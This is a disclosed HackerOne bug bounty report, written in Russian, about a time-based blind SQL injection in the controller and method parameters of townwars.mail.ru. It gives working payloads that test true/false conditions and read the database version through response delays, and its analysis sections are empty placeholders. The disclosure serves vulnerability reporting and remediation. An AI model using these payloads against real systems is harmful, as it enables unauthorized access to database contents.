---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '144674'
original_report_id: '144674'
title: '[townwars.mail.ru] Time-Based SQL Injection'
weakness: SQL Injection
team_handle: mailru
created_at: '2016-06-14T11:30:14.157Z'
disclosed_at: '2016-07-06T13:28:39.004Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- sql-injection
---

# [townwars.mail.ru] Time-Based SQL Injection

## Metadata

- HackerOne Report ID: 144674
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-07-06T13:28:39.004Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Добрый день.

POSТ параметры "c" и "m" (названия контроллера и метода соответственно) уязвимы к атаке типа SQL Injection.

прямого вывода на страницу нет, но можно получить данные ориентируясь на задержку ответа от сервера

если запрос возвращает false - ответ от сервера возвращается быстро.
если запрос возвращает true - то сервер отвечает очень долго, иногда даже возвращает 504 статусом

Пример эксплуатации

POST / HTTP/1.1
Host: townwars.mail.ru
Content-Type: application/x-www-form-urlencoded

c=Registration' or 2=1--  //время ответа - 223мил.
c=Registration' or 1=1--  //время ответа 60сек (504 timeout)

получаем данные

c=Registration' or substr(version(),1,10)='falsefalse'-- //время ответа 6сек
c=Registration' or substr(version(),1,10)='PostgreSQL'--  // 60сек (504 timeout)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
